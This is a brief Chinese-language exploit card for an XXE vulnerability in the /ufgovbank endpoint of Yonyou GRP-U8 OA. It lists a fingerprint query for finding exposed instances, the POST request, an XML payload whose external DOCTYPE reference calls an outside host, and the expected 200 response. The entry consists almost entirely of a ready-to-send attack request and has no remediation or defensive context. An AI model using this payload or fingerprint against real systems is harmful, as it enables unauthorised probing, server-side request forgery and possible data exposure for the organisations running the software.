# 用友GRP-U8ufgovbankXXE漏洞

用友 ｜ XXE ｜ —
- **指纹**：`app.name="用友GRP-U8 OA"`
- **请求**：`POST /ufgovbank HTTP/1.1`

**Payload**
```
reqData=<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://www.baidu.com">&signData=1&userIP=1&srcFlag=1&QYJM=0&QYNC=adaptertest
```
- **响应特征**：200